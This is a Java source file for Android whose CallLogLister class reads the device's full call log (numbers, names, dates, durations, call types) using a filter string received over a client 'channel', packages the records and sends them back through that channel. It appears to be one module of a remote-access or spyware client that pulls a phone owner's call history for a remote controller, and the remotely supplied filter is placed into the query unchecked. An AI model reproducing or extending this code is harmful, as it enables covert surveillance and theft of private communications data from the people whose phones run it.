package my.app.Library;

import java.util.ArrayList;

import my.app.activityclient.ClientListener;
import Packet.CallLogPacket;
import Packet.CallPacket;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;

public class CallLogLister {

	
	public static boolean listCallLog(ClientListener c, int channel, byte[] args) {
		ArrayList<CallPacket> l = new ArrayList<CallPacket>();
		
		boolean ret =false;
		String WHERE_CONDITION = new String(args);
		String SORT_ORDER = "date DESC";
		String[] column = { "_id", "type", "date", "duration", "number","name" ,"raw_contact_id" };
		
		Cursor cursor = c.getContentResolver().query(CallLog.Calls.CONTENT_URI, column , WHERE_CONDITION, null, SORT_ORDER);
		
		
        if(cursor.getCount() != 0) {
	        cursor.moveToFirst();
	
	        do{
	           if(cursor.getColumnCount() != 0) {
	        	   int id = cursor.getInt(cursor.getColumnIndex("_id"));
	        	   int type = cursor.getInt(cursor.getColumnIndex("type"));
	        	   long date = cursor.getLong(cursor.getColumnIndex("date"));
	        	   long duration = cursor.getLong(cursor.getColumnIndex("duration"));
	        	   String number  = cursor.getString(cursor.getColumnIndex("number"));
	        	   String name = cursor.getString(cursor.getColumnIndex("name"));
	        	   int raw_contact_id = cursor.getInt(cursor.getColumnIndex("raw_contact_id"));
	        	   
	        	   l.add(new CallPacket(id, type, date, duration, raw_contact_id, number, name));
	           }
	        }while(cursor.moveToNext());
	        ret = true;
        }
        else
        	ret = false;
		
		
		
		c.handleData(channel, new CallLogPacket(l).build());
		return ret;
	}
	
}
